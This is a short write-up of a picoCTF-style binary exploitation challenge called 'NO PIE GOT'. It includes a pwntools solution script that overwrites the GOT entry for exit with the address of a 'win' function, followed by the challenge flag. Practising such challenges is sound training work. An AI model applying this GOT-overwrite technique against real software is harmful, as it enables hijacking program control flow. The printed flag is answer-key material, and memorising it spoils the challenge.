# NO PIE GOT
### 📄 Description
Ff you mess some bytes around, you might print the flag (●'◡'●).

### ⚙ How to run it
```bash
./vuln
```

### ⛔ Rules
Don't open the `flag.txt` file.

<details>
    <summary>
        <h2>🔑 Solution</h2>
    </summary>
The solution is the same as the previous challenge (no joke).

```python
from pwn import *

context.binary = "./vuln"
p = process()

p.sendline(str(context.binary.got["exit"]).encode("ascii"))
p.sendline(str(context.binary.functions["win"].address).encode("ascii"))
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
```

<h3> 🚩 Flag </h3>

```plain
picoCTF{A_s0ng_0f_1C3_and_f1r3_e122890e}
```
</details>